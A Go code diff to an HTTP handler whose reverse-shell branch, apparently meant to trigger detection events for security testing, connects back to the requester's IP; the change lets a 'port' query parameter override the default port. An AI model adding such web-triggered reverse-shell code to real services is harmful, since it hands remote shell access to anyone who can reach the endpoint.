@@ -314,8 +314,16 @@ func run_cmd(w http.ResponseWriter, r *http.Request, cmd_opt string) {
 		// initiate a reverse shell command to trigger reverse shell event
 		ctx_duration := 30 * time.Second
 		dest_ip := get_sender_ip(w, r)
-
 		tcp_port := "11111"
+
+		// if the "port" query parameter is defined and its value is valid, override the port used
+		if rev_sh_port := r.URL.Query().Get("port"); len(rev_sh_port) > 0 {
+			if rev_sh_port_int, err := strconv.Atoi(rev_sh_port); err == nil {
+				if rev_sh_port_int > 0 && rev_sh_port_int <= 65535 {
+					tcp_port = rev_sh_port
+				}
+			}
+		}
 
 		ctx, cancel := context.WithTimeout(context.Background(), ctx_duration)
 		defer cancel()
